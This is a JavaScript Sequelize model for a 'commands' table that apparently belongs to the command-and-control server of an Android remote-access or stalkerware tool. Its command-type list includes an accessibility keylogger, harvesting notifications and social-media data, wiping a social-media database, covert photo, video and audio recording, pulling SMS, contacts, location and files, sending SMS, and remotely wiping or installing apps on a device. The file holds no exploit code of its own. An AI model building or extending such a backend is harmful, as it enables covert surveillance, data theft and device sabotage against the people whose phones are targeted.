const { DataTypes } = require('sequelize');

module.exports = (sequelize) => {

  const Command = sequelize.define('Command', {

    id: {
      type: DataTypes.UUID,
      defaultValue: DataTypes.UUIDV4,
      primaryKey: true
    },

    deviceId: {
      type: DataTypes.STRING,
      allowNull: false,
      field: 'device_id'
    },

    commandType: {
      type: DataTypes.ENUM(
        'unknown','login','custom',
        'push_tokens','push_data','start_repeat_push_data','stop_repeat_push_data','sync_app_config',
        'push_call_logs','add_call_log','delete_call_log',
        'push_contacts','add_contact','delete_contact',
        'push_messages','send_message',
        'push_file_explorer_walk','push_thumbnails','delete_file','push_file','push_files','get_pending_push_files','delete_pending_push_files','sync_push_files',
        'push_location',
        'vibrate','flash',
        'take_picture','record_video','record_audio',
        'push_installed_app_list','push_app_logs','push_device_info','open_app','make_call','open_deeplink',
        'get_diagnosis','schedule_command','cancel_scheduled_command','start_initializer',
        'connect_socket','disconnect_socket',
        'run_accessibility_command','push_accessibility_keylogger','push_accessibility_notifications','push_accessibility_social_media','accessibility_nuke_social_media_database',
        'set_device_audio','push_device_audio','play_sound',
        'set_dynamic_config','push_dynamic_config',
        'location_request','take_photo','get_contacts','get_sms','send_sms','get_call_logs','get_device_info','lock_device','unlock_device','wipe_device','install_app','uninstall_app','get_installed_apps','show_message'
      ),
      field: 'command_type',
      allowNull: false
    },

    commandData: {
      type: DataTypes.JSON,
      field: 'command_data'
    },

    status: {
      type: DataTypes.ENUM('pending','sent','acknowledged','completed','failed','expired'),
      defaultValue: 'pending'
    },

    priority: {
      type: DataTypes.ENUM('low','normal','high','urgent'),
      defaultValue: 'normal'
    },

    createdBy: {
      type: DataTypes.UUID,
      field: 'created_by'
    },

    sentAt: {
      type: DataTypes.DATE,
      field: 'sent_at'
    },

    acknowledgedAt: {
      type: DataTypes.DATE,
      field: 'acknowledged_at'
    },

    completedAt: {
      type: DataTypes.DATE,
      field: 'completed_at'
    },

    expiresAt: {
      type: DataTypes.DATE,
      field: 'expires_at'
    },

    responseData: {
      type: DataTypes.JSON,
      field: 'response_data'
    },

    errorMessage: {
      type: DataTypes.TEXT,
      field: 'error_message'
    },

    retryCount: {
      type: DataTypes.INTEGER,
      field: 'retry_count',
      defaultValue: 0
    },

    maxRetries: {
      type: DataTypes.INTEGER,
      field: 'max_retries',
      defaultValue: 3
    },

    metadata: DataTypes.JSON

  }, {
    tableName: 'commands',
    timestamps: true,
    paranoid: true,
    underscored: true,
    indexes: [
      { fields: ['device_id'] },
      { fields: ['command_type'] },
      { fields: ['status'] },
      { fields: ['created_at'] }
    ]
  });

  return Command;
};